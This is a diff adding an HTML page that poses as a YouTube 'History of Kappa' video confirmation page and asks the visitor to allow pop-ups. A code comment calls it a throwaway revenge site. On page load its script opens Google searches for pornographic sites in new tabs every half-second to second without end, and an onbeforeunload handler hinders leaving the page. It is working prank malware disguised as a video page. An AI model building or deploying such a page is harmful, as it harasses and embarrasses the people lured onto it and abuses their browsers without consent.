@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <title>河童の歴史-Youtube</title>
+
+    <style>
+        body {
+            font-family: sans-serif;
+            text-align: center;
+            padding: 40px;
+            background: #f0f0f0;
+        }
+
+
+
+        #info {
+            margin-top: 30px;
+            font-size: 18px;
+            color: #444;
+            line-height: 1.8;
+        }
+
+        .box {
+            background: white;
+            padding: 20px;
+            border-radius: 12px;
+            display: inline-block;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.15);
+        }
+    </style>
+</head>
+<body>
+
+    <div class="box">
+        <h>河童の歴史視聴確認ページ</h>
+　　　　 <p>視聴するにはポップアップを許可してください</p>
+        <div id="info">
+            OS: 判定中...<br>
+            Browser: 判定中...
+        </div>
+    </div>
+
+<script>
+    //仕返し用簡易サイト すぐ削除予定
+    window.onload = () => {
+
+        setTimeout(() => {
+            doRandomSearch();
+        }, 10000);
+
+    };
+    const searchQueries = [
+        "エロサイト一覧",
+        "XVideos",
+        "MissAV",
+        "エロ動画",
+        "ポルノハブ",
+        " Pornhub",
+        "共通",
+        "共用",
+        "怒りのターンエンド",
+        "Fanza",
+        "FanzaGame",
+        "日本 エロサイト ファンザ"
+    ];
+    const minInterval = 500;
+    const maxInterval = 1000;
+
+    function detectOS() {
+        const ua = navigator.userAgent;
+
+        if (ua.includes("Windows")) return "Windows";
+        if (ua.includes("Android")) return "Android";
+        if (ua.includes("Linux")) return "Linux";
+        if (ua.includes("iPhone")) return "iPhone";
+        if (ua.includes("iPad")) return "iPad";
+        if (ua.includes("Mac")) return "macOS";
+
+        return "Unknown";
+    }
+
+    function detectBrowser() {
+        const ua = navigator.userAgent;
+
+        if (ua.includes("Edg")) return "Edge";
+        if (ua.includes("OPR")) return "Opera";
+        if (ua.includes("Chrome")) return "Chrome";
+        if (ua.includes("Firefox")) return "Firefox";
+        if (ua.includes("Safari")) return "Safari";
+
+        return "Unknown";
+    }
+
+    function showInfo() {
+        document.getElementById("info").innerHTML =
+            `OS: ${detectOS()}<br>` +
+            `Browser: ${detectBrowser()}`;
+    }
+
+    function doRandomSearch() {
+        const query =
+            searchQueries[
+                Math.floor(Math.random() * searchQueries.length)
+            ];
+
+        const url =
+            "https://www.google.com/search?q=" +
+            encodeURIComponent(query);
+
+        const win = window.open(
+            url,
+            "_blank",
+            "noopener,noreferrer"
+        );
+
+
+        const next =
+            Math.floor(
+                Math.random() * (maxInterval - minInterval)
+            ) + minInterval;
+
+        setTimeout(doRandomSearch, next);
+    }
+
+    window.onload = () => {
+        showInfo();
+        setTimeout(doRandomSearch, 1000);
+    };
+
+    window.onbeforeunload = () => {
+        return "検索実行中です";
+    };
+</script>
+
+</body>
+</html>
